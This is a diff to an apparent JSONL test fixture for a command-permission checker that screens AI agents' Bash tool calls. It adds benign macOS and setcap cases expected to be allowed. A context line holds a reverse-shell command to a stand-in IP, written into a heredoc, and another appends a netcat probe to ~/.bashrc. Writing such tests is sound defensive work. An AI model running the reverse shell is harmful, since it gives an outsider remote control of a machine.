@@ -381,6 +381,11 @@
 {"tool": "Bash", "args": {"command": "cat >> notes.md <<'EOF'\nbash -i >& /dev/tcp/192.0.2.7/4444 0>&1\nEOF"}, "expect": "allow", "note": "a heredoc body starting a network shell, written to a plain file (#996)"}
 {"tool": "Bash", "args": {"command": "cat >> ~/.bashrc <<'EOF'\nnc -zv localhost 80\nEOF"}, "expect": "allow", "note": "a heredoc body with a netcat probe and no exec option stays as it is (#996)"}
 {"tool": "Bash", "args": {"command": "kubectl get --raw /healthz"}, "expect": "allow", "note": "#981: --raw of a path with no /secrets/ segment reads no secret"}
+{"tool": "Bash", "args": {"command": "sysadminctl -secureTokenStatus bob"}, "expect": "allow", "note": "reading a macOS user's secure token status (#996)"}
+{"tool": "Bash", "args": {"command": "dseditgroup -o read admin"}, "expect": "allow", "note": "listing macOS's admin group (#996)"}
+{"tool": "Bash", "args": {"command": "setcap -v cap_net_bind_service+ep ./x"}, "expect": "allow", "note": "verifying a file's capabilities (#996)"}
+{"tool": "Bash", "args": {"command": "cat <<'EOF' | setcap - ./x\ncap_net_bind_service+ep\nEOF"}, "expect": "allow", "note": "a quoted-delimiter heredoc giving setcap - an ordinary capability (#1030)"}
+{"tool": "Bash", "args": {"command": "setcap - ./x <<EOF\ncap_net_bind_service+ep\nEOF"}, "expect": "allow", "note": "setcap's own heredoc giving it an ordinary capability (#1030)"}
 {"tool": "Bash", "args": {"command": "lerna run build"}, "expect": "allow", "note": "dev-only benign twin: building the packages releases nothing", "packs": ["dev"]}
 {"tool": "Bash", "args": {"command": "lerna version"}, "expect": "allow", "note": "dev-only benign twin: versioning publishes nothing", "packs": ["dev"]}
 {"tool": "Bash", "args": {"command": "npx changeset status"}, "expect": "allow", "note": "dev-only benign twin: reading the changeset status publishes nothing", "packs": ["dev"]}
